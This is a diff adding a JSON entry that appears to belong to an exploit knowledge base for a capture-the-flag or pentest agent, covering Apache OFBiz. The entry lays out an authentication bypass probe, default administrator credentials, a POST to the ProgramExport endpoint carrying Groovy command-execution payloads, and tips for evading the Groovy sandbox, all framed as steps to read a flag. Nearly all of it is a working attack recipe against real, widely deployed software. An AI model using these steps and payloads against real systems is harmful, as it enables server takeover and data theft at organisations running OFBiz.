@@ -1,0 +1,60 @@
+{
+  "id": "ofbiz-auth-bypass-groovy-rce",
+  "title": "Apache OFBiz — Auth Bypass then Groovy RCE (CVE-2023-51467 / CVE-2024-45195)",
+  "vuln_pattern": "Apache OFBiz allows authentication/view-access bypass via a crafted request parameter, after which the ProgramExport / screen-render endpoints evaluate attacker-supplied Groovy, yielding remote code execution; default admin creds (admin/ofbiz) also grant the same post-auth Groovy path.",
+  "fingerprint": [
+    "ofbiz",
+    "OFBiz",
+    "Apache OFBiz",
+    "综合业务运营",
+    "ERP",
+    "/webtools/control/",
+    "ProgramExport",
+    "/accounting",
+    "requirePasswordChange",
+    "default creds admin/ofbiz",
+    "screen render groovyProgram",
+    "认证绕过",
+    "鉴权绕过",
+    "代码执行",
+    "远程代码执行",
+    "业务系统",
+    "groovy",
+    "后台"
+  ],
+  "exploit_steps": [
+    "Fingerprint OFBiz (/webtools/control, the ERP branding). Bypass auth with the known override params (e.g. requirePasswordChange=Y or a view-access bypass) OR log in with default creds admin/ofbiz if accepted.",
+    "Reach the Groovy execution surface: POST to /webtools/control/ProgramExport (or the vulnerable screen-render endpoint) with a groovyProgram parameter.",
+    "Supply a Groovy payload that executes a system command (e.g. 'throw new Exception(...execute...)' or ProcessBuilder) to run code server-side.",
+    "Read the flag from the filesystem/DB via the RCE and exfiltrate. If SecurityManager blocks a call, use reflection/ProcessBuilder to bypass."
+  ],
+  "key_payloads": [
+    "cheap detect probe: GET /webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y  -> 200 'PONG' = bypass works",
+    "auth bypass: requirePasswordChange=Y (or the view-access override param)",
+    "POST /webtools/control/ProgramExport  groovyProgram=<command exec>",
+    "Groovy: 'cat /flag'.execute().text  (or ProcessBuilder for sandbox bypass)"
+  ],
+  "category": "web",
+  "cve": [
+    "CVE-2023-51467",
+    "CVE-2023-49070",
+    "CVE-2024-45195"
+  ],
+  "tags": [
+    "ofbiz",
+    "auth-bypass",
+    "groovy-rce",
+    "programexport",
+    "erp",
+    "default-creds"
+  ],
+  "source": "original: OFBiz public CVEs (auth-bypass + ProgramExport Groovy RCE)",
+  "preconditions": [
+    "HTTP access to OFBiz /webtools"
+  ],
+  "verify_oracle": "Groovy command output containing the flag",
+  "pitfalls": [
+    "if the Groovy sandbox blocks Runtime, use ProcessBuilder/reflection; you already have admin via default creds — go straight to ProgramExport"
+  ],
+  "created_ts": 1786600000.0
+}
